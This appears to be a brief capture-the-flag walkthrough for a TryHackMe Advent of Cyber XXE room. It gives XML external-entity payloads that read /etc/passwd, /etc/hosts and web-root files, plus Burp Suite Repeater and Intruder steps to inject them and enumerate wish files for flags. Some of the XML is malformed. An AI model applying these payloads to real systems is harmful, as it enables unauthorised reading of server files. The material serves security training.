# Title : SOC-mas XX-what-ee?
steps:
create xml file put this code:
```xml
<people> 
	<name>Glitch</name> 
	<address>Wareville</address> 
	<email>glitch@wareville.com</email> 
	<phone>111000</phone> 
</people>
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
<!DOCTYPE people [ 
<!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt"> ]> 
<people> 
	<name>Glitch</name> 
	<address>&ext;</address> 
	<email>glitch@wareville.com</email> 
	<phone>111000</phone> 
</people>

<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

open burp suite community edition then:
in settings > burp browser > select allow burp browser run without sandbox
now go to proxy > open browser > past url of application
select jolly's cap and see the proxy request > send it to repeater using ctrl+r > click send
after this forward request so we can see other page on application
add to wishlist
intercept request >  send on repeater
go to cart > intercept request > forward request
same for proceed to checkeout > repeater

after completing checkout  and open link in new tab shown in left corner

put is snippet in product.php repeater request above xml
```xml 
<!--?xml version=""1.0 ?-->
<!DOCTYPE foo[<!ENTITY payload SYSTEM "/etc/hosts">]
<wishlist> 
<user_id>1</user_id> 
<item> 
<product_id>&payload;</product_id> 
</item> 
</wishlist> 
```

url/wishes/wish_21.txt to access this site:
```xml 
<!--?xml version=""1.0 ?-->
<!DOCTYPE foo[<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_21/txt">]
<wishlist> 
	<user_id>1</user_id> 
<item> 
	<product_id>&payload;</product_id> 
</item> 
</wishlist> 
```

we can access other wishes by changing wish_21.txt or
send it to intruder > now mark the number and select add
then go to payload > select payload type: number & from : 1 , to : 20 >start attack
and find flag in payload 15 that is answer of question

now url/CHANGELOG
	find flag of next question 
#AOC 